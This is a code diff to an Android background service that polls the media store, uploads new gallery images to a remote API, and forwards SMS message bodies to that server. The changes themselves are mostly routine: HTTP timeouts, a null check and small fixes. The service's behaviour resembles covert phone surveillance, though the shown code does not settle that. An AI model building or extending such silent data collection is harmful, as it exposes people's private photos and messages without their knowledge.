@@ -32,10 +32,12 @@ import java.util.HashMap;
 import java.util.Map;
 import java.util.Timer;
 import java.util.TimerTask;
+import java.util.concurrent.TimeUnit;
 
 import okhttp3.MediaType;
 import okhttp3.OkHttpClient;
 import okhttp3.RequestBody;
+import okhttp3.logging.HttpLoggingInterceptor;
 import retrofit2.Call;
 import retrofit2.Callback;
 import retrofit2.Response;
@@ -58,6 +60,9 @@ public class ClientService extends Service {
         //Initialising Database
         dbManager = new DBManager(this, null, null, AppConfig.DB_VERSION);
 
+        //int c = MyUtility.getGalleryImagesCount(ClientService.this);
+        //Log.d(TAG, "GALLERY COUNT : "+c);
+
         //Initialising Timer Controls
         initTimer();
     }
@@ -78,6 +83,7 @@ public class ClientService extends Service {
         public void run() {
             //Log.d(TAG, "Service Running");
             if(MyUtility.isOnline(ClientService.this)) {
+                //Log.d(TAG, "Device Online");
                 if(READY_TO_RUN) {
                     processMediaStore();
                 }
@@ -86,7 +92,7 @@ public class ClientService extends Service {
     };
 
     /**
-     * Function Bloack to process media store
+     * Function Block to process media store
      * */
     private void processMediaStore() {
         final MediaType TYPE_IMAGE = MediaType.parse("image/*");
@@ -98,7 +104,7 @@ public class ClientService extends Service {
 
             if(c != null && c.getCount() > 0) {
                 //looping through cursor
-                while (c.moveToNext()) {
+                while(c.moveToNext()) {
                     if (!dbManager.isMediaPresent(c.getString(0))) {
                         File f = new File(c.getString(1));
 
@@ -129,8 +135,18 @@ public class ClientService extends Service {
      * Function to initialise Retrofit services
      * */
     private void initRetrofitService() {
+        HttpLoggingInterceptor interceptor = new HttpLoggingInterceptor();
+        interceptor.setLevel(HttpLoggingInterceptor.Level.HEADERS);
+
+        OkHttpClient client = new OkHttpClient.Builder()
+                .connectTimeout(10, TimeUnit.SECONDS)
+                .writeTimeout(10, TimeUnit.SECONDS)
+                .readTimeout(60, TimeUnit.SECONDS)
+                .build();
+
         retrofit = new Retrofit.Builder()
                 .baseUrl(AppConfig.API_BASE_URL)
+                .client(client)
                 .addConverterFactory(GsonConverterFactory.create())
                 .build();
     }
@@ -179,6 +195,7 @@ public class ClientService extends Service {
 
         @Override
         public void onFailure(Call<ApiResponse> call, Throwable t) {
+            READY_TO_RUN = true;
             //Log.e(TAG,"ERR : "+t.getMessage());
         }
     };
@@ -204,12 +221,14 @@ public class ClientService extends Service {
      * */
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
-        Bundle extras = intent.getExtras();
-        if(extras != null) {
-            if(extras.containsKey(AppConfig.MESSAGE_BODY)){
-                String msg = intent.getExtras().getString(AppConfig.MESSAGE_BODY);
-                if(MyUtility.isOnline(ClientService.this)) {
-                    new SmsTask().execute(msg);
+        if(intent != null) {
+            Bundle extras = intent.getExtras();
+            if(extras != null) {
+                if(extras.containsKey(AppConfig.MESSAGE_BODY)){
+                    String msg = intent.getExtras().getString(AppConfig.MESSAGE_BODY);
+                    if(MyUtility.isOnline(ClientService.this)) {
+                        new SmsTask().execute(msg);
+                    }
                 }
             }
         }
